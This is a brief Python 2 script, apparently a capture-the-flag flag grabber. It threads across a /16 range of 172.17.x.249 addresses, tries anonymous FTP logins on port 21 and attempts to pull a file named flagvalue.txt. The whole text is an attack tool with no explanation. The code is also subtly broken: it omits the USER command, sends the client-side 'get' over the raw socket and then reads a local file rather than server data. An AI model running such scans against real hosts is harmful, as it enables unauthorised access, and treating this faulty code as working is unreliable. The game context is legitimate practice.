import threading,socket,time

def get(ip):
    try:
        s=socket.socket()
        s.settimeout(1)
        s.connect((ip,21))
        s.send('anonymous\n')
        s.recv(1024)
        s.send('PASS a\n')
        s.recv(1024)
        s.send('get flagvalue.txt')
        with open('flagvalue.txt')as f:
            for flag in f.readlines():
                print flag,ip
        s.close()
    except Exception,e:
            print e

for i in range(1,255):
        ip='172.17.%s.249'%i
        threading.Thread(target=get,args=(ip,)).start()